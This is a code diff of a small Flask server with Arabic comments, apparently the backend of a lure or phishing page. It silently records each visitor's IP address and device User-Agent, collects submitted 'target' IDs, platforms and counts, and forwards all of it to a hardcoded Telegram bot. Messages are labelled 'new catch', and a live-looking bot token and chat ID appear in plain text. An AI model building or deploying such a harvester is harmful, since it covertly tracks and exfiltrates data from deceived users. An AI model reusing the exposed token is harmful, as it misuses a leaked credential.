@@ -6,25 +6,31 @@ app = Flask(__name__)
 TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
 CHAT_ID = "5811700860"
 
+def send_to_telegram(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
+
 @app.route('/api/index', methods=['GET', 'POST'])
 def handler():
-    if request.method == 'POST':
-        # استلام النصوص
-        target_id = request.form.get('id')
-        count = request.form.get('count')
-        plat = request.form.get('platform')
-        
-        msg = f"🎯 **صيد جديد**\nالهدف: `{target_id}`\nالعدد: `{count}`\nالمنصة: `{plat}`"
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-
-        # استلام الصورة وإرسالها
-        if 'file' in request.files:
-            file = request.files['file']
-            if file.filename != '':
-                files = {'photo': (file.filename, file.read())}
-                # نستخدم sendPhoto بدل sendDocument عشان تطلع لك الصورة واضحة بالبوت
-                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={'chat_id': CHAT_ID}, files=files)
-        
-        return jsonify({"status": "ok"})
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown Device')
     
-    return "🚀 Server is Running"
+    if request.method == 'GET':
+        # إشعار دخول الموقع
+        msg = f"🔔 **زائر جديد لموقعك!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
+        send_to_telegram(msg)
+        return "ok"
+    
+    else:
+        # إرسال البيانات المكتوبة
+        data = request.json
+        msg = f"🎯 **بيانات جديدة مستلمة!**\n\n" \
+              f"🔹 القسم: {data.get('mode')}\n" \
+              f"🔹 المنصة: {data.get('platform')}\n" \
+              f"🔹 الخدمة: {data.get('service')}\n" \
+              f"🌐 IP: `{user_ip}`\n" \
+              f"📱 الجهاز: `{user_agent}`\n" \
+              f"🔑 الهدف: `{data.get('id')}`\n" \
+              f"🔢 العدد: `{data.get('count')}`"
+        send_to_telegram(msg)
+        return jsonify({"status": "ok"})
